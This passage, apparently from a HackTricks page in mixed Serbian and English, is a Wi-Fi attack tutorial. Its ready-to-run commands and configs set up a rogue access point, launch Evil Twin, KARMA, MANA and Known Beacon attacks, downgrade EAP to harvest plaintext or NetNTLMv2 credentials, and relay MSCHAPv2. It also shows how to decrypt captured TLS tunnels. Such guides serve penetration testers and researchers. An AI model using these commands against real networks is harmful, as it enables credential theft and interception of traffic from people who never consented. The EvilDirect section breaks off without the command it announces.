- Stanice čuvaju ESSID svake bežične mreže na koju se povezuju u svojoj Preferisanoj listi mreža (PNL), zajedno sa konfiguracijskim detaljima specifičnim za mrežu.
- PNL se koristi za automatsko povezivanje na poznate mreže, poboljšavajući korisničko iskustvo pojednostavljivanjem procesa povezivanja.

### Pasivno skeniranje

- AP-ovi periodično emituju beacon frames, najavljujući svoje prisustvo i karakteristike, uključujući AP-ov ESSID osim ako je broadcasting onemogućen.
- Tokom pasivnog skeniranja, stanice slušaju beacon frames. Ako ESSID u beaconu odgovara unosu u PNL stanice, stanica se može automatski povezati na taj AP.
- Poznavanje PNL uređaja omogućava potencijalnu eksploataciju imitiranjem ESSID-a poznate mreže, varajući uređaj da se poveže na rogue AP.

### Aktivno ispitivanje

- Aktivno probing uključuje da stanice šalju probe requests da otkriju obližnje AP-ove i njihove karakteristike.
- Directed probe requests ciljaju određeni ESSID, pomažući da se otkrije da li je konkretna mreža u dometu, čak i ako je hidden network.
- Broadcast probe requests imaju null SSID polje i šalju se svim obližnjim AP-ovima, omogućavajući stanici da proveri bilo koju preferiranu mrežu bez otkrivanja sadržaja svoje PNL.

## Jednostavan AP sa preusmeravanjem na Internet

Pre nego što objasnimo kako izvesti složenije napade, biće objašnjeno **kako** samo **napraviti** **AP** i **preusmeriti** njegov **saobraćaj** na interfejs koji je povezan **na** **Internet**.

Koristeći `ifconfig -a` proverite da li su wlan interfejs koji će se koristiti za kreiranje AP-a i interfejs povezan na Internet prisutni.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Kreirajte konfiguracioni fajl `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Zatim **podesite IPs** i **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
A zatim **pokrenite** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Kreirajte konfiguracioni fajl `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Zaustavite dosadne procese** , postavite **monitor mode**, i **pokrenite hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Prosleđivanje i preusmeravanje
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Evil twin attack iskorišćava način na koji WiFi klijenti prepoznaju mreže, pri čemu se prvenstveno oslanja na ime mreže (ESSID), bez zahteva da base station (access point) autentifikuje sebe klijentu. Ključne tačke uključuju:

- **Teškoće u razlikovanju**: Uređaji teško razlikuju legitimne od rogue access points kada dele isti ESSID i encryption type. U stvarnim mrežama često se koriste više access points sa istim ESSID-om kako bi se neprimetno proširilo pokrivanje.
- **Roaming klijenata i manipulacija vezom**: 802.11 protokol omogućava uređajima da prelaze između access points unutar istog ESS. Napadači mogu iskoristiti ovo tako što navedu uređaj da se diskonektuje od svog trenutnog base station i poveže na rogue access point. To se može postići ponudom jačeg signala ili prekidanjem veze sa legitimnim access point-om putem metoda poput deauthentication packets ili jamming.
- **Izazovi u izvršenju**: Uspešno izvođenje evil twin attack u okruženjima sa više, dobro raspoređenih access points može biti teško. Deauthenticating jednog legitimnog access point-a često rezultira time da se uređaj poveže na drugi legitimni access point, osim ako napadač ne može deauthenticate-ovati sve obližnje access points ili strateški postaviti rogue access point.

Možete napraviti veoma osnovan Open Evil Twin (bez mogućnosti da usmeravate saobraćaj na Internet) na sledeći način:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Takođe možete napraviti Evil Twin koristeći **eaphammer** (imajte na umu da, kako biste kreirali evil twins pomoću eaphammer, interfejs **NE bi trebao biti** u **monitor** režimu):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ili koristeći Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Imajte na umu da se podrazumevano, ako je ESSID u PNL sačuvan kao WPA zaštićen, uređaj neće automatski povezati na Open evil Twin. Možete pokušati da DoS-ujete pravi AP i nadate se da će se korisnik ručno povezati na vaš Open evil Twin, ili možete DoS-ovati pravi AP i koristiti WPA Evil Twin da uhvatite handshake (koristeći ovu metodu nećete moći da omogućite žrtvi da se poveže na vas jer ne znate PSK, ali možete uhvatiti handshake i pokušati da ga crack-ujete).

_Neki OS i AV će upozoriti korisnika da je povezivanje na Open mrežu opasno..._

### WPA/WPA2 Evil Twin

Možete napraviti **Evil Twin using WPA/2** i ako su uređaji podešeni da se povezuju na taj SSID sa WPA/2, pokušaće da se povežu. U svakom slučaju, **to complete the 4-way-handshake** takođe morate **znati** **lozinku** koju će klijent koristiti. Ako je **ne znate**, **povezivanje neće biti završeno**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Da biste razumeli ove napade, preporučujem da pre toga pročitate kratak [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Using hostapd-wpe**

`hostapd-wpe` zahteva **konfiguracioni fajl** da bi radio. Da biste **automatizovali** generisanje ovih konfiguracija, možete koristiti [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (preuzmite python fajl u _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
U konfiguracionom fajlu možete izabrati mnogo različitih stvari, kao što su ssid, channel, user files, cret/key, dh parameters, wpa version i auth...

[**Korišćenje hostapd-wpe sa EAP-TLS da dozvoli prijavu bilo kog sertifikata.**](evil-twin-eap-tls.md)

**Korišćenje EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Podrazumevano, EAPHammer koristi sledeće metode autentifikacije (obratite pažnju na GTC kao prvu koja se koristi da bi se dobile plaintext passwords, a zatim se prelazi na robusnije metode autentifikacije):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Ovo je podrazumevana metodologija da bi se izbegla duga vremena konekcije. Međutim, možete i specificirati serveru authentication methods od najslabijih do najjačih:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (lozinke u običnom tekstu)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (ponudom istih auth metoda u istom redosledu kao organizacija, napad će biti mnogo teže otkriti).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- If devices are configured with "do not validate certificate", a cloned AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) will collect **NetNTLMv2** (PEAP-MSCHAPv2) or **kredencijale u običnom tekstu** (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) both reveals hidden SSIDs during probes and forces reconnects, unless PMF/802.11w blocks spoofed deauth.
- Cracked NetNTLMv2 gives reusable Wi‑Fi/AD creds; GTC yields immediate plaintext.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- For machine accounts with uncrackable random passwords, abuse **MSCHAPv2 relay**: run `hostapd-mana` as the Evil Twin, forwarding the MSCHAPv2 exchange to `wpa_sycophant`, which simultaneously connects to the legitimate AP. Successful relay grants authenticated Wi‑Fi without recovering the password.
- Use builds that support the target security level (WPA3/PMF requires recent hostapd/wpa_supplicant); PMF prevents deauth coercion, so wait for voluntary client associations.

**Using Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (bučno)** or **only create the Evil Attack until someone connects (tihо).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
This will make `hostapd-wpe` to **exchange keys using RSA** instead of DH, so you will be able to **decrypt** the traffic later **knowing the servers private key**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Add a new entry and fill the form with this values: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- The rogue AP will respond only to probe requests from devices specified in the whitelist, remaining invisible to all others not listed.
2. **MAC-based Blacklist**:
- The rogue AP will ignore probe requests from devices on the blacklist, effectively making the rogue AP invisible to those specific devices.
3. **SSID-based Whitelist**:
- The rogue AP will respond to probe requests only for specific ESSIDs listed, making it invisible to devices whose Preferred Network Lists (PNLs) do not contain those ESSIDs.
4. **SSID-based Blacklist**:
- The rogue AP will not respond to probe requests for the specific ESSIDs on the blacklist, making it invisible to devices seeking those particular networks.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ova metoda omogućava napadaču da kreira zlonamerni access point (AP) koji odgovara na sve probe requests od uređaja koja pokušavaju da se povežu na mreže. Ova tehnika vara uređaje da se povežu na napadačev AP imitirajući mreže koje uređaji traže. Kada uređaj pošalje zahtev za povezivanje ovom rogue AP-u, veza se uspostavlja i uređaj greškom postaje povezan na napadačevu mrežu.

### MANA

Ubrzo su uređaji počeli da ignorišu nepouzdane mrežne odgovore, što je smanjilo efikasnost originalnog karma napada. Međutim, nova metoda poznata kao MANA attack je predstavљena od strane Ian de Villiers и Dominic White. Ova metoda uključuje rogue AP koji hvata Preferred Network Lists (PNL) sa uređaja odgovaranjem na njihove broadcast probe requests imenima mreža (SSIDs) koje su ranije sačuvane na uređajima. Ovaj sofisticirani napad zaobilazi zaštite protiv originalnog karma napada iskorišćavanjem načina na koji uređaji pamte i daju prioritet poznatim mrežama.

MANA attack funkcioniše tako što nadgleda i directed и broadcast probe requests od uređaja. Za directed requests beleži MAC address uređaja i ime tražene mreže, dodajući ove podatke na listu. Kada se primi broadcast request, AP odgovara informacijama koje odgovaraju bilo kojoj mreži sa liste uređaja, navodeći uređaj da se poveže na rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** je napredna strategija koja se koristi kada uređaji ne koriste usmereno sondiranje ili kada su njihove liste preferiranih mreža (PNL) nepoznate napadaču. Funkcioniše po principu da **uređaji u istom području verovatno dele neke nazive mreža u svojim PNL-ovima**. Umesto selektivnog odgovaranja, ovaj napad emituje odgovore na probe za svaki naziv mreže (ESSID) pronađen u kombinovanim PNL-ovima svih posmatranih uređaja. Ovaj široki pristup povećava verovatnoću da će neki uređaj prepoznati poznatu mrežu i pokušati da se poveže na lažni Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Kada **Loud MANA attack** možda nije dovoljan, **Known Beacon attack** predstavlja drugi pristup. Ova metoda **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** izvedenih iz wordlist. Ovo simulira prisustvo brojnih mreža, u nadi da će se poklopiti neki ESSID iz žrtvinog PNL, što će pokrenuti pokušaj povezivanja na izmišljeni AP. Napad se može pojačati kombinovanjem sa opcijom `--loud` za agresivniji pokušaj da se uhvate uređaji.

Eaphammer je implementirao ovaj napad kao MANA attack gde se svi ESSIDs iz liste emituju (možete takođe kombinovati ovo sa `--loud` da kreirate Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

**Known Beacon Burst attack** podrazumeva **rapid-fire broadcasting of beacon frames for each ESSID listed in a file**. Ovo stvara gustu okolinu lažnih mreža, znatno povećavajući verovatnoću da se uređaji povežu na rogue AP, posebno kada se kombinuje sa MANA attack. Ova tehnika koristi brzinu i obim da preoptereti mehanizme uređaja za odabir mreže.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** je protokol koji omogućava uređajima da se direktno povežu međusobno koristeći Wi-Fi bez potrebe za tradicionalnom bežičnom pristupnom tačkom. Ova sposobnost je integrisana u različite Internet stvari (IoT) uređaje, kao što su štampači i televizori, olakšavajući direktnu komunikaciju uređaj–uređaj. Značajna karakteristika Wi-Fi Direct-a je da jedan uređaj preuzima ulogu pristupne tačke, poznat kao group owner, za upravljanje vezom.

Bezbednost Wi-Fi Direct veza uspostavlja se kroz **Wi-Fi Protected Setup (WPS)**, koji podržava nekoliko metoda za sigurno uparivanje, uključujući:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Ove metode, posebno PIN entry, podložne su istim ranjivostima kao WPS u tradicionalnim Wi-Fi mrežama, zbog čega su meta sličnih vektora napada.

### EvilDirect Hijacking

**EvilDirect Hijacking** je napad specifičan za Wi-Fi Direct. On odražava koncept Evil Twin napada ali cilja Wi-Fi Direct veze. U ovom scenariju, napadač se predstavlja kao legitimni group owner sa ciljem da prevari uređaje da se povežu na zlonamernu instancu. Ova metoda se može izvesti korišćenjem alata kao što je `airbase-ng` navođenjem kanala, ESSID-a i MAC adrese impersoniranog uređaja:

## Reference

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Pogledajte [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (prijava preko Facebook-a i imitacija WPA u captive portalima)

{{#include ../../banners/hacktricks-training.md}}
